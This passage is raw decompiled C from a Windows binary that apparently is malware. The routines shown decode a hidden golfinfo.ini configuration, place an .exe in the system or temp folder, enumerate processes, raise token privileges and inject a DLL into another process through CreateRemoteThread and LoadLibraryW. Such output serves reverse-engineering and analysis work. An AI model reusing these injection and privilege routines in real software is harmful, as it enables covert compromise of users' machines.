      FUN_00402be0(&DAT_0044e290,DAT_0044e2a8,(void *)0x6e,(void *)0x0,(void *)0x140,(void *)0xbc);
      iVar14 = 0x14;
      iVar13 = 0xa8;
      iVar12 = 0x140;
      iVar7 = 0x186;
      iVar5 = 0x82;
      uVar9 = extraout_ECX_07;
    }
    else if (DAT_0042c440 == 4) {
      FUN_00402be0(&DAT_0044e290,DAT_0044e2a8,(void *)0x10e,(void *)0x6,(void *)0x140,(void *)0xad);
      FUN_00402d70(extraout_ECX_01,0x2a8,(int *)ppvVar3,6,0x50,0x14,0xf0,0);
      iVar14 = 0x14;
      iVar13 = 0x9b;
      iVar12 = 0x140;
      iVar7 = 0x24e;
      iVar5 = 0x14a;
      uVar9 = extraout_ECX_02;
    }
    else if (DAT_0042c440 == 5) {
      FUN_00402be0(&DAT_0044e290,DAT_0044e2a8,(void *)0x69,(void *)0x0,(void *)0x140,(void *)0xd0);
      FUN_00402d70(extraout_ECX_03,0x1b3,(int *)ppvVar3,0,0xb4,0x14,0x8c,0);
      iVar14 = 0x14;
      iVar13 = 0xbc;
      iVar12 = 0x140;
      iVar7 = 0x1ea;
      iVar5 = 0xe6;
      uVar9 = extraout_ECX_04;
    }
    else if (DAT_0042c440 == 6) {
      FUN_00402be0(&DAT_0044e290,DAT_0044e2a8,(void *)0x5a,(void *)0x0,(void *)0x190,(void *)0xdc);
      iVar14 = 0x17;
      iVar13 = 0xc5;
      iVar12 = 400;
      iVar7 = 0x226;
      iVar5 = 0xfa;
      uVar9 = extraout_ECX_05;
    }
    else {
      FUN_00402be0(&DAT_0044e290,DAT_0044e2a8,(void *)0x78,(void *)0x0,(void *)0x154,(void *)0xc8);
      iVar14 = 0x1e;
      iVar13 = 0xaa;
      iVar12 = 0x154;
      iVar7 = 0x226;
      iVar5 = 0x14a;
      uVar9 = extraout_ECX_06;
    }
    FUN_00402d70(uVar9,iVar5,(int *)ppvVar3,iVar7,iVar12,iVar13,0,iVar14);
    _DAT_0043dde8 = 0x33303036;
    DAT_0043ddec._0_1_ = 0;
    iVar5 = FUN_00408b8d(DAT_0044e290,DAT_0044e294,DAT_0044dedc,&DAT_0043ddec,(uint *)&DAT_0042c448)
    ;
    if (iVar5 != 0) goto LAB_004021aa;
  }
  else {
    if ((5 < DAT_0042c440) || (DAT_0044e0f0 != 3)) {
      iVar5 = 0;
      iVar7 = 0;
      iVar12 = DAT_0044e280 - DAT_0044e278;
      iVar13 = DAT_0044e284 - DAT_0044e27c;
      goto LAB_00401ec7;
    }
    DAT_0043ddec._0_1_ = 0;
    _DAT_0043dde8 = 0x33303036;
    if ((DAT_0044e2c8 == (code *)0x0) ||
       ((*DAT_0044e2c8)(&DAT_0042c448), DAT_0044e2cc == (code *)0x0)) goto LAB_004021aa;
    (*DAT_0044e2cc)(&DAT_0043ddec);
  }
  if (DAT_0042c448 - 1U < 0xfffb) {
    DAT_0042c448 = DAT_0042c448 + 4;
    iVar5 = FUN_00404480(&DAT_0043dde8,0);
    if (iVar5 != 0) {
      _DAT_0044dee4 = GetTickCount();
    }
  }
LAB_004021aa:
  ___security_check_cookie_4(local_4 ^ (uint)auStack_3e0);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_004021d0(void)

{
  byte bVar1;
  short sVar2;
  uint uVar3;
  undefined4 *puVar4;
  int iVar5;
  undefined4 *puVar6;
  byte *pbVar7;
  bool bVar8;
  undefined4 local_3e0 [4];
  undefined4 local_3d0;
  undefined4 local_3cc;
  short asStack_32a [369];
  short asStack_48 [20];
  wchar_t local_20 [6];
  undefined4 local_14;
  undefined uStack_10;
  undefined local_f;
  uint local_c;
  
  uVar3 = DAT_0045e2ee;
  local_c = DAT_0042b0a0 ^ (uint)local_3e0;
  _DAT_0042c44c = DAT_0045e2ee;
  _memcpy(&DAT_0042dde8,&DAT_0045e2f2,DAT_0045e2ee);
  if (4 < (int)uVar3) {
    uStack_10 = 0;
    local_f = 0;
    local_14 = DAT_0042dde8;
    _memset(local_3e0,0,0x3c6);
    if (0x3c9 < uVar3) {
      puVar4 = (undefined4 *)&DAT_0042ddec;
      puVar6 = local_3e0;
      for (iVar5 = 0xf1; iVar5 != 0; iVar5 = iVar5 + -1) {
        *puVar6 = *puVar4;
        puVar4 = puVar4 + 1;
        puVar6 = puVar6 + 1;
      }
      *(undefined2 *)puVar6 = *(undefined2 *)puVar4;
    }
    puVar6 = &DAT_00426b74;
    puVar4 = &local_14;
    do {
      bVar1 = *(byte *)puVar4;
      bVar8 = bVar1 < *(byte *)puVar6;
      if (bVar1 != *(byte *)puVar6) {
LAB_00402290:
        iVar5 = (1 - (uint)bVar8) - (uint)(bVar8 != 0);
        goto LAB_00402295;
      }
      if (bVar1 == 0) break;
      bVar1 = *(byte *)((int)puVar4 + 1);
      bVar8 = bVar1 < *(byte *)((int)puVar6 + 1);
      if (bVar1 != *(byte *)((int)puVar6 + 1)) goto LAB_00402290;
      puVar4 = (undefined4 *)((int)puVar4 + 2);
      puVar6 = (undefined4 *)((int)puVar6 + 2);
    } while (bVar1 != 0);
    iVar5 = 0;
LAB_00402295:
    if (iVar5 == 0) {
      iVar5 = FUN_0041034e(local_20);
      if (iVar5 == 1) {
        DAT_0044dde8 = 3;
        ___security_check_cookie_4(local_c ^ (uint)local_3e0);
        return;
      }
    }
    else {
      pbVar7 = &DAT_00426ba0;
      puVar4 = &local_14;
      do {
        bVar1 = *(byte *)puVar4;
        bVar8 = bVar1 < *pbVar7;
        if (bVar1 != *pbVar7) {
LAB_00402300:
          iVar5 = (1 - (uint)bVar8) - (uint)(bVar8 != 0);
          goto LAB_00402305;
        }
        if (bVar1 == 0) break;
        bVar1 = *(byte *)((int)puVar4 + 1);
        bVar8 = bVar1 < pbVar7[1];
        if (bVar1 != pbVar7[1]) goto LAB_00402300;
        puVar4 = (undefined4 *)((int)puVar4 + 2);
        pbVar7 = pbVar7 + 2;
      } while (bVar1 != 0);
      iVar5 = 0;
LAB_00402305:
      if (iVar5 == 0) {
        DAT_0044ded4 = local_3e0[2];
        _DAT_0044dee0 = local_3cc;
        _DAT_0044ded8 = local_3e0[3];
        DAT_0044dedc = local_3d0;
        DAT_0044dde8 = 4;
        if (DAT_0044e2c0 != (code *)0x0) {
          (*DAT_0044e2c0)(1);
          ___security_check_cookie_4(local_c ^ (uint)local_3e0);
          return;
        }
      }
      else {
        puVar4 = &local_14;
        pbVar7 = &DAT_00426ba8;
        do {
          bVar1 = *(byte *)puVar4;
          bVar8 = bVar1 < *pbVar7;
          if (bVar1 != *pbVar7) {
LAB_00402390:
            iVar5 = (1 - (uint)bVar8) - (uint)(bVar8 != 0);
            goto LAB_00402395;
          }
          if (bVar1 == 0) break;
          bVar1 = *(byte *)((int)puVar4 + 1);
          bVar8 = bVar1 < pbVar7[1];
          if (bVar1 != pbVar7[1]) goto LAB_00402390;
          puVar4 = (undefined4 *)((int)puVar4 + 2);
          pbVar7 = pbVar7 + 2;
        } while (bVar1 != 0);
        iVar5 = 0;
LAB_00402395:
        if (iVar5 == 0) {
          DAT_0044dde8 = 3;
          if (DAT_0044e2c0 != (code *)0x0) {
            (*DAT_0044e2c0)(0);
            ___security_check_cookie_4(local_c ^ (uint)local_3e0);
            return;
          }
        }
        else {
          pbVar7 = &DAT_00426bb0;
          puVar4 = &local_14;
          do {
            bVar1 = *(byte *)puVar4;
            bVar8 = bVar1 < *pbVar7;
            if (bVar1 != *pbVar7) {
LAB_004023f7:
              iVar5 = (1 - (uint)bVar8) - (uint)(bVar8 != 0);
              goto LAB_004023fc;
            }
            if (bVar1 == 0) break;
            bVar1 = *(byte *)((int)puVar4 + 1);
            bVar8 = bVar1 < pbVar7[1];
            if (bVar1 != pbVar7[1]) goto LAB_004023f7;
            puVar4 = (undefined4 *)((int)puVar4 + 2);
            pbVar7 = pbVar7 + 2;
          } while (bVar1 != 0);
          iVar5 = 0;
LAB_004023fc:
          if (iVar5 == 0) {
            do {
              sVar2 = *(short *)((int)asStack_48 + iVar5);
              *(short *)((int)&DAT_0044ddf0 + iVar5) = sVar2;
              iVar5 = iVar5 + 2;
            } while (sVar2 != 0);
            iVar5 = 0;
            do {
              sVar2 = *(short *)((int)asStack_32a + iVar5);
              *(short *)((int)&DAT_0044de1c + iVar5) = sVar2;
              iVar5 = iVar5 + 2;
            } while (sVar2 != 0);
            DAT_0044de18 = local_3cc;
            DAT_0044dde8 = 0;
            _DAT_0044dee4 = GetTickCount();
            FUN_00404450();
            Sleep(1000);
          }
        }
      }
    }
  }
  ___security_check_cookie_4(local_c ^ (uint)local_3e0);
  return;
}



void FUN_00402480(void)

{
  wchar_t *pwVar1;
  wchar_t *pwVar2;
  void *unaff_ESI;
  FILE *local_214 [2];
  WCHAR local_20c;
  undefined local_20a [518];
  uint local_4;
  
  local_4 = DAT_0042b0a0 ^ (uint)local_214;
  local_20c = L'\0';
  _memset(local_20a,0,0x206);
  local_214[0] = (FILE *)0x0;
  if (unaff_ESI != (void *)0x0) {
    pwVar1 = L"golfinfo.ini";
    do {
      pwVar2 = pwVar1;
      pwVar1 = pwVar2 + 1;
    } while (*pwVar2 != L'\0');
    if ((int)(pwVar2 + -0x2135e2) >> 1 != 0) {
      GetTempPathW(0x104,&local_20c);
      _wcscat_s(&local_20c,0x104,L"golfinfo.ini");
      __wfopen_s(local_214,&local_20c,L"rb");
      if (local_214[0] != (FILE *)0x0) {
        _fread(unaff_ESI,0x200,1,local_214[0]);
        _fclose(local_214[0]);
        ___security_check_cookie_4(local_4 ^ (uint)local_214);
        return;
      }
    }
  }
  ___security_check_cookie_4(local_4 ^ (uint)local_214);
  return;
}



void FUN_00402570(void)

{
  int iVar1;
  uint uVar2;
  void *unaff_EDI;
  undefined auStack_210 [4];
  int local_20c [129];
  uint local_8;
  
  local_8 = DAT_0042b0a0 ^ (uint)auStack_210;
  if (unaff_EDI != (void *)0x0) {
    _memset(local_20c,0,0x200);
    iVar1 = FUN_00402480();
    if (iVar1 != 0) {
      uVar2 = 0;
      do {
        *(byte *)((int)local_20c + uVar2) = ~*(byte *)((int)local_20c + uVar2);
        uVar2 = uVar2 + 1;
      } while (uVar2 < 0x200);
      if (local_20c[0] == 0x504d534d) {
        _memmove(unaff_EDI,local_20c,0x200);
        ___security_check_cookie_4(local_8 ^ (uint)auStack_210);
        return;
      }
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)auStack_210);
  return;
}



void FUN_00402640(void)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  wchar_t *pwVar3;
  int iVar4;
  int unaff_EDI;
  WCHAR local_20c;
  undefined local_20a [518];
  uint local_4;
  
  local_4 = DAT_0042b0a0 ^ (uint)&local_20c;
  local_20c = L'\0';
  _memset(local_20a,0,0x206);
  GetModuleFileNameW((HMODULE)0x0,&local_20c,0x104);
  pwVar2 = _wcsrchr(&local_20c,L'\\');
  *pwVar2 = L'\0';
  pwVar2 = pwVar2 + 1;
  pwVar3 = _wcsrchr(pwVar2,L'.');
  *pwVar3 = L'\0';
  iVar4 = unaff_EDI - (int)pwVar2;
  do {
    wVar1 = *pwVar2;
    *(wchar_t *)(iVar4 + (int)pwVar2) = wVar1;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  ___security_check_cookie_4(local_4 ^ (uint)&local_20c);
  return;
}



void FUN_004026e0(void)

{
  size_t in_EAX;
  DWORD DVar1;
  int iVar2;
  void *unaff_EBX;
  int iVar3;
  int iVar4;
  
  _memset(unaff_EBX,0,in_EAX);
  iVar4 = (int)(in_EAX + ((int)in_EAX >> 0x1f & 3U)) >> 2;
  DVar1 = GetTickCount();
  FUN_00410a31(DVar1);
  iVar3 = 0;
  if (0 < iVar4) {
    do {
      iVar2 = _rand();
      *(int *)((int)unaff_EBX + iVar3 * 4) = iVar2;
      iVar3 = iVar3 + 1;
    } while (iVar3 < iVar4);
  }
  return;
}



void FUN_00402730(void)

{
  uint _Count;
  void *_DstBuf;
  size_t sVar1;
  DWORD DVar2;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  ulonglong uVar3;
  FILE *local_8;
  FILE *pFStack_4;
  
  local_8 = (FILE *)0x0;
  Sleep(1000);
  __wfopen_s(&local_8,(wchar_t *)&DAT_0044dee8,L"rb");
  if (local_8 != (FILE *)0x0) {
    _fseek(local_8,0,2);
    _Count = _ftell(local_8);
    _DstBuf = (void *)FUN_00410d7f(_Count);
    _fseek(pFStack_4,0,0);
    sVar1 = _fread(_DstBuf,1,_Count,pFStack_4);
    if (_Count == sVar1) {
      DVar2 = GetTickCount();
      FUN_00410a31(DVar2);
      _rand();
      uVar3 = FUN_00412800(extraout_ECX,extraout_EDX);
      if ((int)uVar3 <= (int)_Count) {
        FUN_004026e0();
        _fclose(pFStack_4);
        DeleteFileW((LPCWSTR)&DAT_0044dee8);
        __wfopen_s(&pFStack_4,(wchar_t *)&DAT_0044dee8,L"wb");
        if (pFStack_4 == (FILE *)0x0) {
          return;
        }
        _fwrite(_DstBuf,1,_Count,pFStack_4);
      }
    }
    if (pFStack_4 != (FILE *)0x0) {
      _fclose(pFStack_4);
    }
    if (_DstBuf != (void *)0x0) {
      FUN_0040fb79(_DstBuf);
    }
  }
  return;
}



void FUN_00402870(void)

{
  short sVar1;
  int iVar2;
  undefined auStack_27c [4];
  undefined local_278 [4];
  short asStack_274 [64];
  ushort local_1f4;
  short asStack_1f2 [145];
  wchar_t awStack_d0 [44];
  WCHAR local_78;
  undefined local_76 [106];
  uint local_c;
  
  local_c = DAT_0042b0a0 ^ (uint)auStack_27c;
  local_78 = L'\0';
  _memset(local_76,0,0x62);
  _memset(local_278,0,0x200);
  iVar2 = FUN_00402570();
  if (iVar2 != 0) {
    iVar2 = 0;
    do {
      sVar1 = *(short *)((int)asStack_274 + iVar2);
      *(short *)((int)&DAT_0044ddf0 + iVar2) = sVar1;
      iVar2 = iVar2 + 2;
    } while (sVar1 != 0);
    DAT_0044de18 = (uint)local_1f4;
    iVar2 = 0;
    do {
      sVar1 = *(short *)((int)asStack_1f2 + iVar2);
      *(short *)((int)&DAT_0044de1c + iVar2) = sVar1;
      iVar2 = iVar2 + 2;
    } while (sVar1 != 0);
    if (DAT_0044e0f0 == 3) {
      GetSystemDirectoryW((LPWSTR)&DAT_0044dee8,0x104);
      _wcscat_s((wchar_t *)&DAT_0044dee8,0x104,(wchar_t *)&DAT_00426be0);
    }
    else {
      GetTempPathW(0x104,(LPWSTR)&DAT_0044dee8);
    }
    _wcscat_s((wchar_t *)&DAT_0044dee8,0x104,awStack_d0);
    _wcscat_s((wchar_t *)&DAT_0044dee8,0x104,L".exe");
    FUN_00402730();
    CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&DAT_00402610,(LPVOID)0x0,0,
                 (LPDWORD)0x0);
    FUN_00402640();
    CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,&local_78);
  }
  ___security_check_cookie_4(local_c ^ (uint)auStack_27c);
  return;
}



void FUN_004029e0(void)

{
  BOOL BVar1;
  _OSVERSIONINFOW local_120;
  ushort uStack_c;
  uint local_4;
  
  local_4 = DAT_0042b0a0 ^ (uint)&local_120;
  _memset(&local_120.dwMajorVersion,0,0x118);
  local_120.dwOSVersionInfoSize = 0x11c;
  BVar1 = GetVersionExW(&local_120);
  if (BVar1 != 0) {
    if (local_120.dwMajorVersion == 5) {
      if (local_120.dwMinorVersion == 0) {
        if (3 < uStack_c) {
          ___security_check_cookie_4(local_4 ^ (uint)&local_120);
          return;
        }
      }
      else if ((1 < local_120.dwMinorVersion) || (local_120.dwMinorVersion == 1)) {
        ___security_check_cookie_4(local_4 ^ (uint)&local_120);
        return;
      }
    }
    else if ((local_120.dwMajorVersion == 6) && (local_120.dwMinorVersion == 0)) {
      ___security_check_cookie_4(local_4 ^ (uint)&local_120);
      return;
    }
  }
  ___security_check_cookie_4(local_4 ^ (uint)&local_120);
  return;
}



void FUN_00402ae0(void)

{
  wchar_t *pwVar1;
  wchar_t *unaff_ESI;
  WCHAR local_20c [260];
  uint local_4;
  
  local_4 = DAT_0042b0a0 ^ (uint)local_20c;
  GetModuleFileNameW((HMODULE)0x0,local_20c,0x104);
  pwVar1 = _wcsrchr(local_20c,L'\\');
  *pwVar1 = L'\0';
  _wcscpy_s(unaff_ESI,0x104,local_20c);
  ___security_check_cookie_4(local_4 ^ (uint)local_20c);
  return;
}



void * __cdecl FUN_00402b40(DWORD *param_1)

{
  HMODULE hModule;
  HRSRC hResInfo;
  DWORD _Size;
  HGLOBAL hResData;
  void *_Dst;
  uint _Size_00;
  void *unaff_retaddr;
  
  hModule = GetModuleHandleW((LPCWSTR)0x0);
  hResInfo = FindResourceW(hModule,(LPCWSTR)0x83,L"IDR_BINARY");
  if (hResInfo != (HRSRC)0x0) {
    _Size = SizeofResource(hModule,hResInfo);
    hResData = LoadResource(hModule,hResInfo);
    LockResource(hResData);
    _Size_00 = ((uint)((_Size & 0x1ff) != 0) + (_Size >> 9)) * 0x200;
    *param_1 = _Size;
    _Dst = (void *)FUN_00410d7f(_Size_00);
    _memset(_Dst,0,_Size_00);
    _memcpy(_Dst,unaff_retaddr,_Size);
    FreeResource(hResData);
    return _Dst;
  }
  return (void *)0x0;
}



undefined4
FUN_00402be0(void **param_1,void **param_2,void *param_3,void *param_4,void *param_5,void *param_6)

{
  int iVar1;
  int iVar2;
  void **ppvVar3;
  uint uVar4;
  int iVar5;
  void **ppvVar6;
  void *_Size;
  uint uVar7;
  void *local_2c [3];
  undefined4 local_20;
  int local_18;
  
  if (param_2 != (void **)0x0) {
    if (*param_1 != (void *)0x0) {
      _free(*param_1);
    }
    *param_1 = (void *)0x0;
    param_1[1] = (void *)0x0;
    ppvVar6 = param_2;
    ppvVar3 = local_2c;
    for (iVar5 = 0xb; iVar2 = (int)local_2c[2], iVar1 = (int)local_2c[1], iVar5 != 0;
        iVar5 = iVar5 + -1) {
      *ppvVar3 = *ppvVar6;
      ppvVar6 = ppvVar6 + 1;
      ppvVar3 = ppvVar3 + 1;
    }
    if (((int)param_3 < (int)local_2c[1]) && ((int)param_4 < (int)local_2c[2])) {
      if (param_5 == (void *)0x0) {
        param_5 = (void *)((int)local_2c[1] - (int)param_3);
      }
      else if ((int)local_2c[1] < (int)param_3 + (int)param_5) {
        param_5 = (void *)((int)local_2c[1] - (int)param_3);
      }
      if ((param_6 == (void *)0x0) || ((int)local_2c[2] < (int)param_4 + (int)param_6)) {
        param_6 = (void *)((int)local_2c[2] - (int)param_4);
      }
      local_18 = ((int)((local_20 >> 0x10) * (int)param_5 + 0x1f) >> 3 & 0xfffffffcU) * (int)param_6
      ;
      local_2c[1] = param_5;
      param_1[1] = (void *)(local_18 + 0x28U);
      local_2c[2] = param_6;
      ppvVar3 = (void **)_malloc((size_t)(void *)(local_18 + 0x28U));
      *param_1 = ppvVar3;
      uVar4 = (uint)local_20._2_2_;
      ppvVar6 = local_2c;
      for (iVar5 = 10; iVar5 != 0; iVar5 = iVar5 + -1) {
        *ppvVar3 = *ppvVar6;
        ppvVar6 = ppvVar6 + 1;
        ppvVar3 = ppvVar3 + 1;
      }
      uVar7 = (int)(uVar4 * iVar1 + 0x1f) >> 3 & 0xfffffffc;
      _Size = (void *)((int)(uVar4 * (int)param_5 + 0x1f) >> 3 & 0xfffffffc);
      iVar5 = 0x28;
      if (0 < (int)param_6) {
        param_4 = (void *)(((iVar2 - (int)param_6) - (int)param_4) * uVar7 + 0x28 +
                           ((int)(uVar4 * (int)param_3 + ((int)(uVar4 * (int)param_3) >> 0x1f & 7U))
                           >> 3) + (int)param_2);
        param_3 = param_6;
        do {
          _memcpy((void *)((int)*param_1 + iVar5),param_4,(size_t)_Size);
          param_4 = (void *)((int)param_4 + uVar7);
          iVar5 = iVar5 + (int)_Size;
          param_3 = (void *)((int)param_3 + -1);
        } while (param_3 != (void *)0x0);
      }
      param_1[3] = param_5;
      param_1[4] = param_6;
      param_1[2] = (void *)(uint)local_20._2_2_;
      param_1[5] = _Size;
    }
    return 1;
  }
  return 0;
}



undefined4 __fastcall
FUN_00402d70(undefined4 param_1,int param_2,int *param_3,int param_4,int param_5,int param_6,
            int param_7,int param_8)

{
  int iVar1;
  int *unaff_EBX;
  size_t _Size;
  int *piVar2;
  int iVar3;
  int *piVar4;
  uint uVar5;
  int local_30;
  int local_2c [11];
  
  if ((*unaff_EBX == 0) || (param_3 == (int *)0x0)) {
    return 0;
  }
  if ((param_7 < unaff_EBX[3]) && (iVar3 = unaff_EBX[4], param_8 < iVar3)) {
    piVar2 = param_3;
    piVar4 = local_2c;
    for (iVar1 = 0xb; iVar1 != 0; iVar1 = iVar1 + -1) {
      *piVar4 = *piVar2;
      piVar2 = piVar2 + 1;
      piVar4 = piVar4 + 1;
    }
    if ((param_2 < local_2c[1]) && (param_4 < local_2c[2])) {
      if (param_5 == 0) {
        local_30 = local_2c[1] - param_2;
      }
      else if (local_2c[1] < param_2 + param_5) {
        local_30 = local_2c[1] - param_2;
      }
      else {
        local_30 = param_5;
      }
      if (param_6 == 0) {
        param_6 = local_2c[2] - param_4;
      }
      else if (local_2c[2] < param_4 + param_6) {
        param_6 = local_2c[2] - param_4;
      }
      if (unaff_EBX[3] - param_7 < local_30) {
        local_30 = unaff_EBX[3] - param_7;
      }
      param_5 = param_6;
      if (iVar3 - param_8 < param_6) {
        param_5 = iVar3 - param_8;
      }
      iVar1 = ((uint)local_2c[3] >> 0x10) * param_2;
      uVar5 = (int)(((uint)local_2c[3] >> 0x10) * local_2c[1] + 0x1f) >> 3 & 0xfffffffc;
      param_6 = ((local_2c[2] - param_5) - param_4) * uVar5 + 0x28 +
                ((int)(iVar1 + (iVar1 >> 0x1f & 7U)) >> 3);
      iVar1 = unaff_EBX[2];
      param_8 = ((int)(iVar1 * param_7 + (iVar1 * param_7 >> 0x1f & 7U)) >> 3) + 0x28 +
                ((iVar3 - param_5) - param_8) * unaff_EBX[5];
      _Size = (int)(iVar1 + (iVar1 >> 0x1f & 7U)) >> 3;
      if ((int)((uint)local_2c[3] >> 0x13) < (int)_Size) {
        _Size = (uint)local_2c[3] >> 0x13;
      }
      if (0 < param_5) {
        param_7 = param_5;
        do {
          iVar3 = 0;
          if (0 < local_30) {
            param_4 = 0;
            do {
              _memcpy((void *)(((int)(unaff_EBX[2] * iVar3 + (unaff_EBX[2] * iVar3 >> 0x1f & 7U)) >>
                               3) + *unaff_EBX + param_8),
                      (void *)(((int)(param_4 + (param_4 >> 0x1f & 7U)) >> 3) + param_6 +
                              (int)param_3),_Size);
              param_4 = param_4 + ((uint)local_2c[3] >> 0x10);
              iVar3 = iVar3 + 1;
            } while (iVar3 < local_30);
          }
          param_6 = param_6 + uVar5;
          param_8 = param_8 + unaff_EBX[5];
          param_7 = param_7 + -1;
        } while (param_7 != 0);
      }
    }
    return 1;
  }
  return 0;
}



void __fastcall FUN_00402f50(int *param_1)

{
  HANDLE hObject;
  int iVar1;
  int iVar2;
  int *_Str2;
  undefined4 local_234;
  int iStack_230;
  wchar_t awStack_214 [260];
  uint uStack_c;
  uint local_4;
  
  local_4 = DAT_0042b0a0 ^ (uint)&local_234;
  local_234 = 0;
  hObject = (HANDLE)CreateToolhelp32Snapshot(2,0);
  if (hObject == (HANDLE)0xffffffff) {
    GetCurrentProcessId();
    GetLastError();
  }
  else {
    _memset(&stack0xfffffdc8,0,0x22c);
    iVar1 = Process32FirstW(hObject,&stack0xfffffdc8);
    if (iVar1 == 1) {
      do {
        iVar1 = 0;
        if (0 < *param_1) {
          _Str2 = param_1 + 1;
          do {
            iVar2 = __wcsicmp(awStack_214,(wchar_t *)_Str2);
            if (iVar2 == 0) {
              param_1[0x283] = iVar1;
              _wcscpy_s((wchar_t *)(param_1 + 0x285),0x40,awStack_214);
              param_1[0x284] = iStack_230;
              _wcscpy_s((wchar_t *)(param_1 + 0x2a6),0x40,
                        (wchar_t *)(param_1 + param_1[0x283] * 0x20 + 0x141));
              goto LAB_00403005;
            }
            iVar1 = iVar1 + 1;
            _Str2 = _Str2 + 0x20;
          } while (iVar1 < *param_1);
        }
        iVar1 = Process32NextW(hObject,&stack0xfffffdc8);
      } while (iVar1 == 1);
      GetLastError();
    }
    else {
      GetLastError();
    }
LAB_00403005:
    CloseHandle(hObject);
  }
  ___security_check_cookie_4(uStack_c ^ (uint)&stack0xfffffdc4);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00403080(undefined4 param_1)

{
                    // WARNING: Could not recover jumptable at 0x004030a4. Too many branches
                    // WARNING: Treating indirect jump as call
  (*_DAT_0046eaf8)(&LAB_004030aa,0,param_1);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __thiscall
FUN_004030f0(void *this,int param_1,int param_2,undefined4 param_3,undefined4 param_4,int param_5,
            int param_6)

{
  undefined local_112 [254];
  uint local_14;
  undefined4 local_10;
  int local_c;
  int local_8;
  
  local_14 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  _memset(local_112,0,0xfe);
  if ((*(int *)((int)this + 0xa04) == 5) && (*(int *)((int)this + 0xa08) != 0)) {
    local_10 = 0x1014;
  }
  else if ((*(int *)((int)this + 0xa04) == 5) && (*(int *)((int)this + 0xa08) == 0)) {
    local_10 = 0x1275;
  }
  else if (*(int *)((int)this + 0xa04) == 3) {
    local_10 = 0x1250;
  }
  else {
    local_10 = 0x1014;
  }
  local_c = param_1 + param_5;
  local_8 = param_2 + param_6;
                    // WARNING: Could not recover jumptable at 0x004031cb. Too many branches
                    // WARNING: Treating indirect jump as call
  (*_DAT_0046eb00)(local_c,local_8);
  return;
}



DWORD __fastcall FUN_004032f0(DWORD param_1)

{
  short sVar1;
  short *in_EAX;
  HANDLE hProcess;
  LPVOID lpBaseAddress;
  short *psVar2;
  BOOL BVar3;
  HMODULE hModule;
  LPTHREAD_START_ROUTINE lpStartAddress;
  HANDLE hHandle;
  DWORD DVar4;
  DWORD DVar5;
  
  DVar5 = 0;
  if ((param_1 != 0) && (in_EAX != (short *)0x0)) {
    psVar2 = in_EAX;
    do {
      sVar1 = *psVar2;
      psVar2 = psVar2 + 1;
    } while (sVar1 != 0);
    if (3 < (uint)((int)psVar2 - (int)(in_EAX + 1) >> 1)) {
      hProcess = OpenProcess(0x1fffff,1,param_1);
      if (hProcess == (HANDLE)0x0) {
        DVar5 = GetLastError();
        GetLastError();
      }
      else {
        lpBaseAddress = VirtualAllocEx(hProcess,(LPVOID)0x0,0x104,0x3000,4);
        if (lpBaseAddress == (LPVOID)0x0) {
          GetLastError();
          DVar5 = GetLastError();
        }
        else {
          psVar2 = in_EAX;
          do {
            sVar1 = *psVar2;
            psVar2 = psVar2 + 1;
          } while (sVar1 != 0);
          BVar3 = WriteProcessMemory(hProcess,lpBaseAddress,in_EAX,
                                     ((int)psVar2 - (int)(in_EAX + 1) >> 1) * 2 + 2,(SIZE_T *)0x0);
          if (BVar3 == 0) {
            GetLastError();
            DVar5 = GetLastError();
          }
          else {
            hModule = GetModuleHandleA("Kernel32.dll");
            if (hModule == (HMODULE)0x0) {
              GetLastError();
              DVar5 = GetLastError();
            }
            else {
              lpStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule,"LoadLibraryW");
              if (lpStartAddress == (LPTHREAD_START_ROUTINE)0x0) {
                GetLastError();
                DVar5 = GetLastError();
              }
              else {
                hHandle = CreateRemoteThread(hProcess,(LPSECURITY_ATTRIBUTES)0x0,0,lpStartAddress,
                                             lpBaseAddress,0,(LPDWORD)0x0);
                if (hHandle == (HANDLE)0x0) {
                  GetLastError();
                  DVar5 = GetLastError();
                }
                else {
                  DVar4 = WaitForSingleObject(hHandle,10000);
                  if (DVar4 == 0xffffffff) {
                    DVar5 = 0xffffffff;
                  }
                }
                if (hHandle != (HANDLE)0x0) {
                  CloseHandle(hHandle);
                }
              }
            }
          }
        }
      }
      if (hProcess != (HANDLE)0x0) {
        CloseHandle(hProcess);
      }
      return DVar5;
    }
  }
  return 0xffffffff;
}



bool FUN_00403450(void)

{
  DWORD DVar1;
  DWORD *unaff_ESI;
  HANDLE unaff_EDI;
  DWORD local_28;
  _TOKEN_PRIVILEGES local_24;
  _TOKEN_PRIVILEGES local_14;
  
  local_14.Privileges[0].Luid.LowPart = *unaff_ESI;
  local_14.Privileges[0].Luid.HighPart = unaff_ESI[1];
  local_28 = 0x10;
  local_14.PrivilegeCount = 1;
  local_14.Privileges[0].Attributes = 0;
  AdjustTokenPrivileges(unaff_EDI,0,&local_14,0x10,&local_24,&local_28);
  DVar1 = GetLastError();
  if (DVar1 != 0) {
    return false;
  }
  local_24.Privileges[0].Luid.LowPart = *unaff_ESI;
  local_24.Privileges[0].Luid.HighPart = unaff_ESI[1];
  local_24.Privileges[0].Attributes = local_24.Privileges[0].Attributes | 2;
  local_24.PrivilegeCount = 1;
  AdjustTokenPrivileges(unaff_EDI,0,&local_24,local_28,(PTOKEN_PRIVILEGES)0x0,(PDWORD)0x0);
  DVar1 = GetLastError();
  return (bool)('\x01' - (DVar1 != 0));
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __thiscall
FUN_004034f0(void *this,int param_1,int param_2,int param_3,int param_4,HWND param_5)

{
  int iVar1;
  undefined4 uVar2;
  tagBITMAPINFO *ptVar3;
  DWORD *pDVar4;
  int iStack00000018;
  LPSTR local_7c;
  HBITMAP local_78;
  int local_70;
  HDC local_6c;
  int local_68;
  int local_64;
  BOOL local_50;
  int local_4c;
  HDC local_48;
  HGDIOBJ local_44;
  tagBITMAPINFO local_40;
  undefined4 local_14;
  int local_10;
  HDC local_c;
  int local_8;
  
  iStack00000018 = 0;
  FUN_00403890(&DAT_00426bba,&local_7c);
